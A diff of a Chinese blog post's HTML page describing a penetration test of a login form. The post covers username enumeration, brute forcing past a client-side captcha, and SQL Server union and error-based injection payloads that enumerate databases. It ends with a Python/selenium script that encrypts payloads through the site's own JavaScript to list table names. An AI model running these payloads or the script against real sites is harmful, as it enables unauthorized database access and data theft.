@@ -1,135 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>记一次 SQL Server 报错注入 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>记一次 SQL Server 报错注入</h1>
-      
-<div class="post-meta">
-    <time>2018-12-24</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
-</div>
-
-      <div><h3 id="0x00-验证码前端验证">0x00 验证码前端验证</h3>
-<p>需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行
-<img src="/img/post/20181224-200518.png" alt="40"></p>
-<p>那就抓个包吧
-<img src="/img/post/20181224-200528.png" alt="70"></p>
-<p>emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：</p>
-<p>用户不存在时返回
-<code>{&quot;iserror&quot;:true,&quot;message&quot;:&quot;用户名不存在！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}</code></p>
-<p>用户名存在时返回
-<code>{&quot;iserror&quot;:true,&quot;message&quot;:&quot;密码不正确！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}</code></p>
-<p>可以的，验证码前端验证，我觉得可以burp抓包intruder一下</p>
-<p>跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad</p>
-<h3 id="0x01-存在注入">0x01 存在注入</h3>
-<p>嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！
-<img src="/img/post/20181224-201033.png" alt="80">
-<img src="/img/post/20181224-201133.png" alt="80">
-<img src="/img/post/20181224-201233.png" alt="80"></p>
-<p>可以的，and 1=1 有注入</p>
-<p>哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？</p>
-<p>刚才看了数据包，用户名密码都是32位，猜想sql语句是：<code>select password from user where username=name_md5_hash</code>，然后判断用户存不存在之类的</p>
-<p>看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。</p>
-<p>试试post其他用户名和密码，然后看数据包
-<img src="/img/post/20181224-201534.png" alt="80"></p>
-<p>显然并不是md5。。。。  这个是前端加密后发送的。。。。。看一下js，结果发现了这个
-<img src="/img/post/20181224-201945.png" alt="80">
-<img src="/img/post/20181224-202035.png" alt="80"></p>
-<p>emmmmm，想了想，应该可以注入的，看看啥系统
-<img src="/img/post/20181224-202205.png" alt="50"></p>
-<p>大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server
-<img src="/img/post/20181224-202314.png" alt="80"></p>
-<p>看看数据库版本，嗯，看来还是报错注入
-<img src="/img/post/20181224-202358.png" alt="80"></p>
-<p>可以可以，看看有几列，然后进行union注入
-<img src="/img/post/20181224-202513.png" alt="80">
-<img src="/img/post/20181224-202556.png" alt="80"></p>
-<p>一列，这里也能大致猜出来sql语句了，估计就是：<code>select password from user where username='admin'</code></p>
-<p>那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。</p>
-<p>得到第一个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=1</code>
-<img src="/img/post/20181224-202716.png" alt="80"></p>
-<p>得到第二个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=2</code>
-<img src="/img/post/20181224-202751.png" alt="80"></p>
-<p>得到第5个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=5</code>
-<img src="/img/post/20181224-202830.png" alt="80"></p>
-<p>好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。</p>
-<p>py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入</p>
-<h3 id="0x02-尝试写php得到加密后的payload">0x02 尝试写php得到加密后的payload</h3>
-<p>把加密的那个js文件SkyEnCode.js保存到本地，然后写php文件，php的话接收一个未加密的payload然后返回一个加密后的payload，大致代码：</p>
-<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>记一次 SQL Server 报错注入 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>记一次 SQL Server 报错注入</h1><div class=post-meta><time>2018-12-24</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>)</div><div><h3 id=0x00-验证码前端验证>0x00 验证码前端验证</h3><p>需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行
+<img src=/img/post/20181224-200518.png alt=40></p><p>那就抓个包吧
+<img src=/img/post/20181224-200528.png alt=70></p><p>emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：</p><p>用户不存在时返回
+<code>{"iserror":true,"message":"用户名不存在！","data":null,"errorfieldlist":null}</code></p><p>用户名存在时返回
+<code>{"iserror":true,"message":"密码不正确！","data":null,"errorfieldlist":null}</code></p><p>可以的，验证码前端验证，我觉得可以burp抓包intruder一下</p><p>跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad</p><h3 id=0x01-存在注入>0x01 存在注入</h3><p>嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！
+<img src=/img/post/20181224-201033.png alt=80>
+<img src=/img/post/20181224-201133.png alt=80>
+<img src=/img/post/20181224-201233.png alt=80></p><p>可以的，and 1=1 有注入</p><p>哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？</p><p>刚才看了数据包，用户名密码都是32位，猜想sql语句是：<code>select password from user where username=name_md5_hash</code>，然后判断用户存不存在之类的</p><p>看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。</p><p>试试post其他用户名和密码，然后看数据包
+<img src=/img/post/20181224-201534.png alt=80></p><p>显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个
+<img src=/img/post/20181224-201945.png alt=80>
+<img src=/img/post/20181224-202035.png alt=80></p><p>emmmmm，想了想，应该可以注入的，看看啥系统
+<img src=/img/post/20181224-202205.png alt=50></p><p>大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server
+<img src=/img/post/20181224-202314.png alt=80></p><p>看看数据库版本，嗯，看来还是报错注入
+<img src=/img/post/20181224-202358.png alt=80></p><p>可以可以，看看有几列，然后进行union注入
+<img src=/img/post/20181224-202513.png alt=80>
+<img src=/img/post/20181224-202556.png alt=80></p><p>一列，这里也能大致猜出来sql语句了，估计就是：<code>select password from user where username='admin'</code></p><p>那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。</p><p>得到第一个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=1</code>
+<img src=/img/post/20181224-202716.png alt=80></p><p>得到第二个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=2</code>
+<img src=/img/post/20181224-202751.png alt=80></p><p>得到第5个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=5</code>
+<img src=/img/post/20181224-202830.png alt=80></p><p>好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。</p><p>py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入</p><h3 id=0x02-尝试写php得到加密后的payload>0x02 尝试写php得到加密后的payload</h3><p>把加密的那个js文件SkyEnCode.js保存到本地，然后写php文件，php的话接收一个未加密的payload然后返回一个加密后的payload，大致代码：</p><pre tabindex=0><code>&lt;!DOCTYPE html&gt;
 &lt;head&gt;
     &lt;script src=jquery.min.js&gt;&lt;/script&gt;
     &lt;script src=SkyEnCode.js&gt;&lt;/script&gt;
@@ -146,34 +45,21 @@
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre><p>看了下，返回的结果是一样的，可以用(实际上并不能。。。)
-<img src="/img/post/20181224-203312.png" alt="75"></p>
-<h3 id="0x03-通过python获取js加密后的payload">0x03 通过python获取js加密后的payload</h3>
-<p>本来是写python获取加密后的payload来着</p>
-<pre tabindex="0"><code>def encode_payload(payload):
+<img src=/img/post/20181224-203312.png alt=75></p><h3 id=0x03-通过python获取js加密后的payload>0x03 通过python获取js加密后的payload</h3><p>本来是写python获取加密后的payload来着</p><pre tabindex=0><code>def encode_payload(payload):
     html = requests.get(&#34;http://127.0.0.1/tmp.php?name={}&#34;.format(payload)).text
     m = re.findall(r&#39;&gt;&gt;&gt;(.*?)&lt;&lt;&lt;&#39;, html)
     return m
-</code></pre><p>但是获取到的是：<code>[u&quot;'+SkyEnCode.EscKeyCode(name)+'&quot;]</code>，因为js没有执行加载，所以得到的是js未执行时的页面源码</p>
-<p>记得以前看过一个东西，selenium，可以调用浏览器驱动模拟浏览器点击啥的，记得可以执行js，想到就做</p>
-<p>首先安装selenium：<code>sudo pip install selenium --user -U</code></p>
-<p>然后在<a href="http://chromedriver.storage.googleapis.com/index.html?_blank">http://chromedriver.storage.googleapis.com/index.html</a>下载Chrome的驱动，然后放到/opt下</p>
-<pre tabindex="0"><code>[21:07 reber@wyb in ~]
+</code></pre><p>但是获取到的是：<code>[u"'+SkyEnCode.EscKeyCode(name)+'"]</code>，因为js没有执行加载，所以得到的是js未执行时的页面源码</p><p>记得以前看过一个东西，selenium，可以调用浏览器驱动模拟浏览器点击啥的，记得可以执行js，想到就做</p><p>首先安装selenium：<code>sudo pip install selenium --user -U</code></p><p>然后在<a href=http://chromedriver.storage.googleapis.com/index.html?_blank>http://chromedriver.storage.googleapis.com/index.html</a>下载Chrome的驱动，然后放到/opt下</p><pre tabindex=0><code>[21:07 reber@wyb in ~]
 ➜  ls /opt/chromedriver
 /opt/chromedriver
 [21:07 reber@wyb in ~]
 ➜  /opt/chromedriver --version
 ChromeDriver 70.0.3538.97 (d035916fe243477005bc95fe2a5778b8f20b6ae1)
 </code></pre><p>获取加密后payload的代码重写如下(此时已经不需要页面接收参数了，页面能引入js我们调用执行就行)：
-<img src="/img/post/20181224-204122.png" alt="80"></p>
-<p>python运行后得到的userName和网页上的一样
-<img src="/img/post/20181224-204417.png" alt="70">
-<img src="/img/post/20181224-204444.png" alt="80"></p>
-<h3 id="0x04-得到数据库的表名">0x04 得到数据库的表名</h3>
-<p>数据库名的话可以通过union注入改变dbid即可得到，比较简单，表名的话这里写代码获取第5个数据库gansu的表名
-<img src="/img/post/20181224-204559.png" alt=""></p>
-<p>不再继续深入</p>
-<h3 id="0x05-详细代码">0x05 详细代码</h3>
-<pre tabindex="0"><code>#!/usr/bin/env python
+<img src=/img/post/20181224-204122.png alt=80></p><p>python运行后得到的userName和网页上的一样
+<img src=/img/post/20181224-204417.png alt=70>
+<img src=/img/post/20181224-204444.png alt=80></p><h3 id=0x04-得到数据库的表名>0x04 得到数据库的表名</h3><p>数据库名的话可以通过union注入改变dbid即可得到，比较简单，表名的话这里写代码获取第5个数据库gansu的表名
+<img src=/img/post/20181224-204559.png alt></p><p>不再继续深入</p><h3 id=0x05-详细代码>0x05 详细代码</h3><pre tabindex=0><code>#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # code by reber &lt;1070018473@qq.com&gt;
 
@@ -232,35 +118,12 @@ def get_tables(database):
     print tables
 
 get_tables(&#39;gansu&#39;)
-</code></pre></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
